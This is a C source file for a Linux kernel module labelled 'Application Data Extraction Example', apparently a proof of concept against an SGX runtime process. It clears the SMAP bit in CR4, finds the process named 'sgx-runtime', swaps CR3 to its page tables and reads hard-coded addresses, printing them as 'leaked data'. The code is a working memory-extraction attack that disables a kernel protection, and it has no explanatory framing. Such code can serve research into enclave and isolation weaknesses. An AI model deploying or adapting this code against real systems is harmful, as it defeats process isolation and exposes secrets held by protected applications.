#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/init.h>
#include <asm/pgtable.h>
#include <asm/pgtable_64.h>
#include <asm/page_types.h>
#include <asm/tlbflush.h>
#include <asm/cpufeature.h>
#include <asm/uaccess.h>
#include <asm/siginfo.h>

#pragma GCC optimize ("O0")
#define APP "sgx-runtime"
#define ADDR1 0x50001fe8
#define ADDR2 0x50003fdc

void change_cr3(unsigned long long CR3){
        asm("cli\n");
        asm("movq %0, %%cr3" ::"r"(CR3));
        asm("sti\n");
}

void disable_smap(void){
        unsigned long long CR4;
        asm("movq %%cr4, %0\n" :"=r"(CR4));
        printk("CR4 before: %llx\n", CR4);
        CR4 = CR4 & (~(1<<21));                 // 21th: SMAP, 20th: SMEP
        printk("CR4 after: %llx\n", CR4);
        asm("movq %0, %%cr4\n" ::"r"(CR4));
}

int init_module(void){
        printk("Application Data Extraction Example\n");
        disable_smap();
        struct task_struct *p;
        unsigned int leak1;
        unsigned int leak2;
        unsigned long long FAKE_CR3=0;
        unsigned long long REAL_CR3=0;
        for_each_process(p) {
                if(p->mm != 0 && !strcmp(p->comm, APP)){
                        FAKE_CR3 = virt_to_phys(p->mm->pgd);
                        REAL_CR3 = virt_to_phys(current->mm->pgd);
                        printk("Task %s (pid = %d), fCR3:%llx, rCR3:%llx\n",p->comm, task_pid_nr(p), FAKE_CR3, REAL_CR3);
                        printk("start_data: %p, end_data: %p\n", p->mm->start_data, p->mm->end_data);

                        // change CR3
                        change_cr3(FAKE_CR3);
                        leak1 = *(unsigned int*)ADDR1;
                        change_cr3(REAL_CR3);

                        printk("leaked data1: %llx addr:%p\n", leak1, ADDR1);

                        change_cr3(FAKE_CR3);
                        leak2 = *(unsigned int*)ADDR2;
                        change_cr3(REAL_CR3);

                        printk("leaked data2: %llx addr:%p\n", leak2, ADDR2);
                }
        }
        return 0;       // must return 0
}

void cleanup_module(void){
        printk("bye\n");
}

